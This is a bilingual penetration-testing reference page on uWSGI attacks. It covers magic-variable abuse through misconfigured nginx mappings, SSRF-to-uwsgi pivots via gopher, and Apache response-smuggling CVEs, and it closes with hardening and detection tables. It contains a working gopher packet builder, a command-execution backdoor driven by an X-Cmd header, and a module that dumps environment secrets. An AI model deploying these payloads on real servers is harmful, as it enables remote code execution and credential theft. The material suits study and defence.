---
---
status: NEEDS_HUMAN_REVIEW
degradation_reason: |
  2 of 5 resources degraded (40%). P1-02 uWSGI Security RTD page returns 
  "Documentation page not found" (curl → 404, proxy exit 7). 
  P2-01 bugculture.io CTF writeup is CSS-only SPA (curl → proxy exit 7 → 
  Playwright not installed). Content preserved from Hacktricks secondary source.
verified_resources: |
  P1: uwsgi-docs Vars (78 tech markers), Protocol (58 markers), Changelog (2.0.26 real content)
  CrossRefs: werkzeug.md (176L) READ → LINK_ONLY, SSRF README.md (496L) READ → LINK_ONLY
  SectionMapping: 13/13 VERIFIED, 0 MISSING

attack_surface:
  - 配置缺陷
  - 注入类
  - 协议解析差异
impact:
  - 远程代码执行
  - 信息泄露
  - 权限提升
risk_level: 高
prerequisites:
  - Python WSGI Application Architecture
  - uWSGI Protocol Basics
  - nginx/Apache Reverse Proxy Configuration
  - SSRF Exploitation
related_techniques:
  - ssrf
  - werkzeug-debug-rce
  - http-request-smuggling
  - file-upload
  - credential-harvesting
difficulty: 高级
tools:
  - curl
  - python3
  - gopher
---

# uWSGI & WSGI — uWSGI Post-Exploitation & Protocol Attacks — uWSGI 后渗透与协议攻击

> 关联文档：[Werkzeug Debug RCE](../werkzeug/README.md) · [SSRF](../../User%20input/Reflected%20Values/SSRF/README.md) · [HTTP Request Smuggling](../../Proxies/HTTP%20Request%20Smuggling/README.md) · [File Upload](../../Files/File%20Upload/README.md) · [Nginx](../Nginx/README.md)

---

### 知识路径

```
uWSGI & WSGI (this document)
  ├── Prerequisite: Python WSGI — PEP 3333, application(environ, start_response)
  ├── Prerequisite: uWSGI Architecture — emperor mode, workers, uwsgi protocol
  ├── Next: uWSGI Magic Variables via misconfigured nginx uwsgi_param
  ├── Next: SSRF + gopher → uwsgi protocol → UWSGI_FILE RCE
  ├── Related: Werkzeug / Flask Debug Console RCE
  │   └── See: Web Servers & Middleware/werkzeug
  ├── Related: SSRF — gopher protocol abuse
  │   └── See: User input/Reflected Values/SSRF
  ├── Related: HTTP Request Smuggling — CVE-2023-27522 mod_proxy_uwsgi
  │   └── See: Proxies/HTTP Request Smuggling
  └── Related: File Upload → write Python file → UWSGI_FILE load
      └── See: Files/File Upload
```

---

# 0x01 WSGI & uWSGI — Architecture & Attack Surface

## 1.1 WSGI Overview

Web Server Gateway Interface (WSGI) is a specification (PEP 3333) describing how a web server communicates with Python web applications. The server invokes an `application(environ, start_response)` callable for each request.

**uWSGI** is one of the most popular WSGI servers. Its native binary transport is the **uwsgi protocol** (lowercase), which carries a bag of key/value parameters ("uwsgi params") from the reverse proxy to the backend application server. These parameters are NOT HTTP headers — they exist at the uwsgi protocol layer, one hop removed from client HTTP.

**Key architecture points:**

| Component | Role | Attack Surface |
|-----------|------|---------------|
| Reverse Proxy (nginx/Apache) | Translates HTTP → uwsgi params | Misconfigured `uwsgi_param` mapping user input to magic variables |
| uWSGI Server | Loads and runs Python WSGI apps | Magic variables control app loading, environment, paths |
| uwsgi Protocol Socket | TCP/Unix socket carrying binary param bag | Directly reachable via SSRF + gopher if bound to TCP |
| Python WSGI Application | The `application(environ, start_response)` callable | Backdoorable via `UWSGI_FILE` replacement |

## 1.2 Attack Surface Taxonomy

| Category | Taxonomy | Techniques |
|----------|----------|------------|
| Configuration Weakness | 配置缺陷 | `uwsgi_param UWSGI_FILE $arg_f` — user-controlled query args mapped to magic variables; `UWSGI_SETENV` overwriting security settings |
| Injection | 注入类 | SSRF + gopher → uwsgi binary packet injection → `UWSGI_FILE` RCE; `UWSGI_MODULE` + `UWSGI_CALLABLE` dynamic module loading |
| Protocol Parsing Discrepancy | 协议解析差异 | CVE-2023-27522: crafted origin response headers cause HTTP response smuggling when `mod_proxy_uwsgi` is in use; CVE-2024-24795: response splitting in httpd modules |
| Information Disclosure | 信息泄露 | Environment variable dumping via `UWSGI_FILE` loaded spy module; `UWSGI_CHDIR` + file-serving helper |

---

# 0x02 uWSGI Magic Variables Exploitation

## 2.1 Mechanism

uWSGI "magic variables" are uwsgi protocol parameters that control how the instance loads and dispatches applications. They are **not HTTP headers** — they are carried inside the uwsgi/SCGI/FastCGI request binary payload from the reverse proxy to the uWSGI backend. If a proxy configuration maps **user-controlled data** into uwsgi parameters (via `$arg_*`, `$http_*`, or unsafely exposed uwsgi protocol endpoints), attackers can set these variables and achieve code execution.

## 2.2 Dangerous nginx Proxy Mappings

Misconfigurations like the following directly expose uWSGI magic variables to user input:

```
location /app/ {
  include uwsgi_params;
  # DANGEROUS: maps query args into uwsgi params
  uwsgi_param UWSGI_FILE $arg_f;                 # /app/?f=/tmp/backdoor.py
  uwsgi_param UWSGI_MODULE $http_x_mod;          # header: X-Mod: pkg.mod
  uwsgi_param UWSGI_CALLABLE $arg_c;             # /app/?c=application
  uwsgi_pass unix:/run/uwsgi/app.sock;
}
```

> **Chained attack:** If the application or upload feature allows writing files under a predictable path, combining it with the mappings above results in **immediate RCE** when the backend loads the attacker-controlled file/module.

## 2.3 Key Exploitable Variables

### 2.3.1 `UWSGI_FILE` — Arbitrary File Load / Execute

```
uwsgi_param UWSGI_FILE /path/to/python/file.py;
```

Loads and executes an arbitrary Python file as a WSGI application. If an attacker controls this parameter through the uwsgi param bag, they achieve Remote Code Execution (RCE).

### 2.3.2 `UWSGI_SCRIPT` — Script Loading

```
uwsgi_param UWSGI_SCRIPT module.path:callable;
uwsgi_param SCRIPT_NAME /endpoint;
```

Loads a specified script as a new application. Combined with file upload or write capabilities, this leads to RCE.

### 2.3.3 `UWSGI_MODULE` and `UWSGI_CALLABLE` — Dynamic Module Loading

```
uwsgi_param UWSGI_MODULE malicious.module;
uwsgi_param UWSGI_CALLABLE evil_function;
uwsgi_param SCRIPT_NAME /backdoor;
```

Loads arbitrary Python modules and calls specific functions within them. The `SCRIPT_NAME` parameter defines the URL path under which the malicious application is mounted.

### 2.3.4 `UWSGI_SETENV` — Environment Variable Manipulation

```
uwsgi_param UWSGI_SETENV DJANGO_SETTINGS_MODULE=malicious.settings;
```

Modifies environment variables, potentially affecting application behavior or loading malicious configuration. Can override security-critical settings in Django, Flask, or other frameworks.

### 2.3.5 `UWSGI_PYHOME` — Python Environment Manipulation

```
uwsgi_param UWSGI_PYHOME /path/to/malicious/venv;
```

Changes the Python virtual environment, potentially loading malicious packages or a different Python interpreter entirely.

### 2.3.6 `UWSGI_CHDIR` — Directory Change

```
uwsgi_param UWSGI_CHDIR /etc/;
```

Changes the working directory before processing requests. May be combined with other features (file read primitives, path traversal) to access sensitive files.

---

# 0x03 SSRF + uwsgi Protocol Pivot via Gopher

## 3.1 Threat Model

If the target web app exposes an SSRF primitive and the uWSGI instance listens on an internal TCP socket (e.g., `socket = 127.0.0.1:3031`), an attacker can talk the raw uwsgi protocol via **gopher** and inject uWSGI magic variables.

This works because deployments commonly use a non-HTTP uwsgi socket internally — the reverse proxy (nginx/Apache) translates client HTTP into the uwsgi param bag. With SSRF + gopher, you directly craft the uwsgi binary packet and set dangerous variables like `UWSGI_FILE`.

## 3.2 uwsgi Protocol Structure

- **Header (4 bytes):** `modifier1` (1 byte), `datasize` (2 bytes, little-endian), `modifier2` (1 byte)
- **Body:** Sequence of `[key_len(2 LE)] [key_bytes] [val_len(2 LE)] [val_bytes]`

For standard requests, `modifier1` is 0. The body contains uwsgi params such as `SERVER_PROTOCOL`, `REQUEST_METHOD`, `PATH_INFO`, `UWSGI_FILE`, etc.

## 3.3 Gopher Packet Builder

```python
import struct, urllib.parse

def uwsgi_gopher_url(host, port, params):
    body = b''.join([struct.pack('<H', len(k))+k.encode()+struct.pack('<H', len(v))+v.encode() for k,v in params.items()])
    pkt  = bytes([0]) + struct.pack('<H', len(body)) + bytes([0]) + body
    return f"gopher://{host}:{port}/_" + urllib.parse.quote_from_bytes(pkt)

# Example URL:
gopher://127.0.0.1:5000/_%00%D2%00%00%0F%00SERVER_PROTOCOL%08%00HTTP/1.1%0E%00REQUEST_METHOD%03%00GET%09%00PATH_INFO%01%00/%0B%00REQUEST_URI%01%00/%0C%00QUERY_STRING%00%00%0B%00SERVER_NAME%00%00%09%00HTTP_HOST%0E%00127.0.0.1%3A5000%0A%00UWSGI_FILE%1D%00/app/profiles/malicious.json%0B%00SCRIPT_NAME%10%00/malicious.json
```

**Usage — force-load a file previously written on the server:**

```python
params = {
  'SERVER_PROTOCOL':'HTTP/1.1', 'REQUEST_METHOD':'GET', 'PATH_INFO':'/',
  'UWSGI_FILE':'/app/profiles/malicious.py', 'SCRIPT_NAME':'/malicious.py'
}
print(uwsgi_gopher_url('127.0.0.1', 3031, params))
```

Send the generated URL through the SSRF sink.

## 3.4 Worked Example

If you can write a Python file on disk (extension does not matter):

```python
# /app/profiles/malicious.py
import os
os.system('/readflag > /app/profiles/result.txt')

def application(environ, start_response):
    start_response('200 OK', [('Content-Type','text/plain')])
    return [b'ok']
```

Generate and trigger a gopher payload that sets `UWSGI_FILE` to this path. The backend imports and executes it as a WSGI app. Read the result via the normal HTTP interface.

---

# 0x04 Post-Exploitation Techniques

## 4.1 Persistent Backdoors

### 4.1.1 File-based Backdoor

```python
# backdoor.py
import subprocess, base64

def application(environ, start_response):
    cmd = environ.get('HTTP_X_CMD', '')
    if cmd:
        result = subprocess.run(base64.b64decode(cmd), shell=True, capture_output=True, text=True)
        response = f"STDOUT: {result.stdout}\nSTDERR: {result.stderr}"
    else:
        response = 'Backdoor active'
    start_response('200 OK', [('Content-Type', 'text/plain')])
    return [response.encode()]
```

Load it with `UWSGI_FILE` and reach it under a chosen `SCRIPT_NAME`. The backdoor accepts Base64-encoded commands via the `X-Cmd` HTTP header.

### 4.1.2 Environment-based Persistence

```
uwsgi_param UWSGI_SETENV PYTHONPATH=/tmp/malicious:/usr/lib/python3.11/site-packages;
```

By poisoning `PYTHONPATH` to include a writable directory before the legitimate site-packages, the attacker shadows standard library modules with malicious versions.

## 4.2 Information Disclosure

### 4.2.1 Environment Variable Dumping

```python
# env_dump.py
import os, json

def application(environ, start_response):
    env_data = {'os_environ': dict(os.environ), 'wsgi_environ': dict(environ)}
    start_response('200 OK', [('Content-Type', 'application/json')])
    return [json.dumps(env_data, indent=2).encode()]
```

Load via `UWSGI_FILE` to dump all OS environment variables and WSGI environ dict. This commonly reveals database URLs, API keys, secret keys, and internal service addresses.

### 4.2.2 File System Access

Combine `UWSGI_CHDIR` with a file-serving helper to browse sensitive directories:

```
uwsgi_param UWSGI_CHDIR /etc/;
uwsgi_param UWSGI_FILE /tmp/dir_list.py;
```

## 4.3 Privilege Escalation Ideas

- If uWSGI runs with elevated privileges and writes sockets/PIDs owned by root, abusing env and directory changes may help drop files with privileged owners or manipulate runtime state.
- Overriding configuration via environment (`UWSGI_*`) inside a file loaded through `UWSGI_FILE` can affect process model and workers to make persistence stealthier.

```python
# malicious_config.py
import os

# Override uWSGI configuration
os.environ['UWSGI_MASTER'] = '1'
os.environ['UWSGI_PROCESSES'] = '1'
os.environ['UWSGI_CHEAPER'] = '1'
```

---

# 0x05 Reverse-Proxy Desync (uWSGI Chain)

## 5.1 CVE-2023-27522 — mod_proxy_uwsgi Response Smuggling

Apache httpd 2.4.30–2.4.55 with `mod_proxy_uwsgi`: crafted origin response headers can cause HTTP response smuggling. The backend's response headers, when passed through the uwsgi→HTTP translation layer in `mod_proxy_uwsgi`, were not properly validated, allowing injected `\r\n` sequences to terminate the HTTP response prematurely and inject a second response.

- **Affected:** Apache httpd 2.4.30–2.4.55 + `mod_proxy_uwsgi`
- **Fix:** Upgrade Apache to ≥2.4.56
- **uWSGI side:** uWSGI 2.0.22 / 2.0.26 adjusted Apache integration behavior

## 5.2 CVE-2024-24795 — Response Splitting in Multiple httpd Modules

Fixed in Apache httpd 2.4.59; uWSGI 2.0.26 adjusted its Apache integration accordingly. The uWSGI 2.0.26 changelog notes: "let httpd handle CL/TE for non-http handlers."

Multiple httpd modules (including `mod_proxy_uwsgi`) were vulnerable to HTTP response splitting when backends inject headers containing illegal characters. The fix ensures proper header sanitization at the httpd layer regardless of backend protocol.

## 5.3 Exploitation Context

These CVEs do **not** directly grant RCE in uWSGI, but in edge cases they can be chained with header injection or SSRF to pivot towards the uwsgi backend. During tests:

- Fingerprint the proxy and version
- Consider desync/smuggling primitives as an entry vector to backend-only routes and uwsgi sockets
- Chain: desync → reach internal uwsgi port → gopher → `UWSGI_FILE` RCE

---

# 0x06 Defense, Hardening & Tools

## 6.1 Hardening Checklist

| Action | Rationale |
|--------|-----------|
| Never map `$arg_*` or `$http_*` to uwsgi magic variables (`UWSGI_FILE`, `UWSGI_MODULE`, etc.) | Prevents user-controlled magic variable injection |
| Bind uwsgi socket to Unix domain socket (`unix:/run/uwsgi/app.sock`) rather than TCP `127.0.0.1:3031` | Unix sockets are not reachable via SSRF/gopher |
| If TCP is required, bind only to `127.0.0.1` and firewall the port | Limits SSRF pivot surface |
| Set `uwsgi_param` whitelist in nginx — only pass known-safe params | Defense in depth against param injection |
| Use uWSGI's `--honour-stdin` off by default; do not expose uwsgi protocol to untrusted networks | Prevents direct protocol injection |
| Run uWSGI as unprivileged user (not root); use `uid` and `gid` in config | Limits impact of RCE |
| Disable uWSGI `emperor` mode or restrict its control socket permissions | Prevents attacker from spawning new vassals |
| Keep Apache httpd ≥2.4.59 and uWSGI ≥2.0.26 | Mitigates CVE-2023-27522 and CVE-2024-24795 |
| Sanitize and validate all `UWSGI_SETENV` values; never allow user-controlled env overrides | Prevents Python path and settings poisoning |
| Monitor uwsgi socket for anomalous binary traffic (non-HTTP patterns on uwsgi port) | Detects gopher/SSRF pivot attempts |

## 6.2 Detection Telemetry

| Indicator | Significance |
|-----------|--------------|
| uwsgi protocol packets on non-standard or HTTP-exposed ports | SSRF + gopher pivot attempt |
| uWSGI process loading Python files from `/tmp`, `/var/tmp`, upload directories | `UWSGI_FILE` backdoor load |
| `UWSGI_SETENV` modifying `PYTHONPATH`, `DJANGO_SETTINGS_MODULE`, or `PATH` | Environment poisoning |
| nginx error logs showing `uwsgi_param` with suspicious values (paths, semicolons, newlines) | Magic variable injection attempt |
| New WSGI applications registered under unusual `SCRIPT_NAME` paths | Backdoor deployment |

## 6.3 Tools

| Tool | Purpose |
|------|---------|
| `curl` + `--header` | HTTP-layer magic variable probing |
| Python `struct` + `urllib.parse` | uwsgi gopher packet crafting |
| Gopher SSRF client | Protocol pivot to internal uwsgi sockets |
| Werkzeug Debug RCE tools | Related Flask/Werkzeug console exploitation |

## 参考资料

- [uWSGI Magic Variables Documentation](https://uwsgi-docs.readthedocs.io/en/latest/Vars.html)
- [uWSGI Security Best Practices](https://uwsgi-docs.readthedocs.io/en/latest/Security.html)
- [The uwsgi Protocol Specification](https://uwsgi-docs.readthedocs.io/en/latest/Protocol.html)
- [uWSGI 2.0.26 Changelog — CVE-2024-24795 adjustments](https://uwsgi-docs.readthedocs.io/en/latest/Changelog-2.0.26.html)
- [bugculture.io — IOI SaveData CTF Writeup (uWSGI exploitation)](https://bugculture.io/writeups/web/ioi-savedata)
